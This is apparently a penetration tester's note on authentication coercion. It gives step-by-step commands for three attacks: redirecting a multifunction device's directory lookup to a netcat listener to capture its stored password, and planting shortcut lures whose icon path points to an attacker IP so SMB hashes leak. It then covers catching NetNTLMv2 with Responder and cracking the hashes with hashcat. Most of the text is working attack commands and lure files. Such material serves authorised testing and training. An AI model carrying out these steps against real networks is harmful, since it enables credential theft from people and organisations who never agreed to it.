# Authentication Coercion

Stop guessing credentials and make something send you one instead. A device holds a password so it can query the directory, a person walks past a folder with their session already open — in both cases the credential is in motion and you only have to be standing where it lands. This is the road in when every password you sprayed came back empty.

## Making a device hand over its stored directory password

Why the credential is there at all: a device that lets someone type a colleague's name on its panel and scan a document to them has to look that colleague up somewhere, and that somewhere is the domain's directory. So the device stores an account name and a password and uses them to sign in to the directory each time. The panel shows that account name in plain text and the password as a row of dots — but the dots are a display choice, and the stored value behind them is intact and unencrypted.

The attack redirects the lookup. You change the directory server address in the device's configuration to your own machine, press the button that tests the connection, and the device signs in to you, using the password it has held for years. Three things make it work, and all three are configuration rather than software flaws: the panel is often still on its factory password, the account is often far more privileged than a directory lookup needs, and the sign-in is often unencrypted because nobody turned encryption on.

```bash
nc -lvnp 3489
```

- `-l` → listen rather than connect.
- `-v` → verbose, and the one that is easy to omit. Without it a connection arrives, the credential arrives with it, and your terminal prints nothing to tell you a connection ever happened — so you press the test button again, and again, reading silence as failure.
- `-n` → never resolve addresses to names, so the connecting device is reported as an address and the listener does not pause on a name lookup.
- `-p 3489` → the port. It has to match what you typed into the device's configuration, and it has to be one you can bind: anything below 1024 needs root, and on a machine already running its own directory service the standard port 389 is taken, which is the usual reason for a high port here.

> [!important] The panel's password field and the device's memory are different things
> A masked field does not mean the value is gone, and a field you cannot read does not mean a field the device cannot send. You are not extracting the password from the browser — you are asking the device to use it, at an address you chose.

## Making a person or service hand over its hash

Why it fires without a click: a file browser draws icons for the files in a folder as soon as the folder is opened. A shortcut file is allowed to say where its icon lives, and that location may be on another machine — written as two backslashes, a host, and a path. So the moment the folder is drawn, the machine connects to that host to fetch a picture, and because the file-sharing protocol authenticates before it does anything else, it signs in first, on behalf of whoever is looking. That sign-in is what you are collecting. The looker need not be a person: a service that scans a share on a timer to index icons and metadata trips the same wire, and hands you the account it runs as.

Confirm first that you can actually plant a file — a share you can read is not always one you can write:

```bash
smbclient //<target>/<share> -N -c 'put test.txt'
```

- `putting file test.txt as \test.txt` → writable, the road is open. `NT_STATUS_ACCESS_DENIED` → you can look but not drop, and this technique is closed.
- `-N` → no password, the anonymous case you are usually in before you hold any credential. A share that needs one takes `-U 'DOMAIN\user%password'` instead.

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://domain.local
WorkingDirectory=share
IconFile=\\<your ip>\share\icon.ico
IconIndex=1
EOF
```

- the quotes around `'EOF'` → the one that is easy to omit, and omitting it destroys the attack silently. Unquoted, the shell processes what it reads and turns each pair of backslashes into one, so the icon path becomes a single-backslash string that is not a network path at all. The file is created, the upload succeeds, the folder gets opened, and nothing ever connects to you.
- `IconFile` → the only line that matters. The other three are there so the file is a well-formed shortcut; the address in `URL` is never fetched by anyone and can be anything.
- the leading `@` in the filename → sorts the file to the top of the folder listing, so it is among the first icons drawn rather than one that needs scrolling to. A file below the fold is a file whose icon is never requested.

> [!warning] One lure format is a bet, not a guarantee
> A `.url` icon fires only if whatever reads the folder resolves `.url` icons. A person browsing in a file manager will; an automated scanner that inspects metadata may walk straight past it — which is exactly the case that leaves you watching an empty listener while the file sits in the share. When one format brings nothing after several enumeration cycles, suspect the format, not the attack.

`ntlm_theft` writes the whole family of auto-triggering files in one go, so you stop betting on a single type:

```bash
git clone https://github.com/Greenwolf/ntlm_theft.git
```

```bash
python3 ntlm_theft/ntlm_theft.py -g all -s <your ip> -f lure
```

- `-g all` → every format; `-s` the IP the icons point back to; `-f` the output folder name.
- the files marked `BROWSE TO FOLDER` are meant to fire on enumeration alone, but not all still do on current Windows: `.scf` was mitigated years ago and `desktop.ini` needs the folder flagged a particular way, while `.lnk`, `.library-ms` and `.url` are the current bets. Drop several of those and let whichever the reader honours fire. The rest need a file actually opened, which a scanner will not do for you.

Upload keeps the local name only when you give it the remote name too:

```bash
smbclient //<target>/<share> -N -c 'put lure/lure.lnk lure.lnk'
```

- one argument (`put lure/lure.lnk`) sends the whole local path as the remote name — the share has no `lure\` folder, so it answers `NT_STATUS_OBJECT_PATH_NOT_FOUND`, which reads like the share rejecting you. Name the remote file as the second argument. This is the same one-argument trap the file transfer protocol has, documented in [[21-FTP]].

## Catching what comes back

```bash
sudo responder -I tun0
```

- `-I tun0` → the interface to listen on, and the one that is easy to get wrong rather than easy to omit: the tool refuses to start without it, but naming your ordinary network interface instead of the tunnel you reached the target through means it listens where nothing will ever arrive, and it reports itself as running perfectly while doing so.
- `sudo` → the tool binds the file-sharing port and several others below 1024. Without it the start fails on a permission error that names a port, which reads as the port being taken rather than as your privileges.
- the port conflict that costs the most time: a machine already running its own file-sharing service occupies that port, so the tool cannot bind it, and the one thing you needed to catch is the one thing it cannot catch. Stop that service before starting the listener.

Two checks save a wasted wait:

- a capture prints live, but it is also written to `/usr/share/responder/logs/`, one file per source — `SMB-NTLMv2-SSP-<target ip>.txt`. Read there rather than trusting that you never blinked.
- nothing after several cycles, with the listener confirmed up, means no sign-in reached you *by any protocol*. Check the log folder for an HTTP capture too: an icon fetch the target cannot make over the file-sharing port can fall back to WebDAV and land as HTTP instead. If nothing arrives on anything, the target cannot open that port back to you, and the lure has to ride WebDAV rather than a plain share path.

> [!warning] This tool answers questions it was not asked, by default
> Beyond listening, it replies to the local name-lookup broadcasts that Windows machines send when ordinary name resolution fails — claiming to be whatever host was asked for, so that traffic meant for a mistyped name comes to you instead. That is active interference with a production network, not passive collection, and on a real engagement it needs to be in scope in writing. Analysis mode listens and answers nothing when you want the safe version.

## Cracking what you caught

What lands is a [[Security-Terms#^netntlmv2|NetNTLMv2]] response — not the password itself and not a hash you can replay, so it opens only against a wordlist.

```bash
head -1 /usr/share/responder/logs/SMB-NTLMv2-SSP-<target ip>.txt > hash.txt
```

- the listener appends one line per sign-in, so a service that authenticates every couple of minutes fills the file with the same account under a fresh challenge each time. Each challenge is a distinct salt — a value mixed into the response so one password never produces the same bytes twice — and the cracker runs every salt as its own job, the same password cracked hundreds of times over. One line is enough.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

- `-m 5600` → NetNTLMv2 (NT LAN Manager response, version 2). When rockyou comes up dry, rules and larger lists are in [[Hash-Cracking]].
- cracked → you hold a plaintext password. Take it to [[▸ AD-Run-Sheet]] step 4 to test it, and read a `(Guest)` tag there as a miss, not a login.
